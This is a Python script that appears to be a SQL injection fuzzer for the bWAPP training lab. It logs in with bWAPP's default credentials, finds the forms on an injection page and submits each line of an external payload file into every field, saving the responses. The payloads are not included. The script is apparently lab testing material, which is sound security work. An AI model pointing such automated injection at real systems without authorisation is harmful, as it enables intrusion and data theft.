import json
import requests
from parser import HTMLForm
from parser import HTMLTargetParser

#Method for logging into the application and creating a Session for accessing the 
#different vulnerable pages in the bWAPP server for demonstration and testing
def LOGIN(loginUrl):
    session = requests.Session()
    loginPayload = {'login':'bee','password':'bug','security_level':'0','form':'submit'}
    login = session.post(loginUrl, data=loginPayload)
    return session
    
#Method for parsing the web page and finding all HTML forms 
def parseHtmlPage(url,session):
    r = session.get(url)
    targetParser = HTMLTargetParser()
    targetParser.feed(r.text)
    if not targetParser.formList:
        print ("[-] The given URL had no forms for targetting")
        exit()
    return targetParser

#Method for creating the dictionary data structure according to the referred HTML Form
#The dictonary structure will be used in the POST/GET requests
def createDictionary(form,value):
    dataValues={}
    for dataField in form.elementList:
        #The action field of a button will not be processed by SQL
        if dataField[1] == 'action':
            dataValues.update({dataField[1]:dataField[3]})
        else:
            dataValues.update({dataField[1]:value})
    print ("[+] Dictionary structure for sending the " + form.formType + " request")
    print (dataValues)
    return dataValues

def sendRequestAndSaveResponse(url,session,dataValues,requestType,fileName):
    if (requestType == 'POST'):
        dataValues.update({'action':'search'})
        s = session.post(url, data = dataValues)  
    if (requestType == 'GET'):
        s = session.get(url, params = dataValues)
    f = open(fileName,'w')
    f.write(s.text)
    f.close()
            
def BEGIN():
	res = ["URL"]
	return res

def RUN(file_name):
    loginUrl ='http://169.254.5.156/bWAPP/login.php'
    url = 'http://169.254.5.156/bWAPP/sqli_6.php'
    nonMaliciousValue='cebola'
    attemptsFolder='attempts/'
    filePrefix = 'form-'
    nonMaliciousResponseFileName = '-nonMaliciousAttempt'
    maliciousResponseFileName = '-attempt-'
    payloadFileName='sql_inj_payload'

    session = LOGIN(loginUrl)
    targetParser = parseHtmlPage(url,session) 

    for index,form in enumerate(targetParser.formList):
        dataValues = createDictionary(form,nonMaliciousValue)
        filePath = attemptsFolder + filePrefix + str(index) + nonMaliciousResponseFileName
        requestType = form.formType
        sendRequestAndSaveResponse(url,session,dataValues,requestType,filePath)

    for index,form in enumerate(targetParser.formList):
        payloadFile = open(payloadFileName,'r')
        for attempt,payload in enumerate(payloadFile): 
            dataValues = createDictionary(form,payload)
            filePath = attemptsFolder + filePrefix+ str(index) + maliciousResponseFileName + str(attempt)
            requestType=form.formType
            sendRequestAndSaveResponse(url,session,dataValues,requestType,filePath)
        payloadFile.close()
RUN("")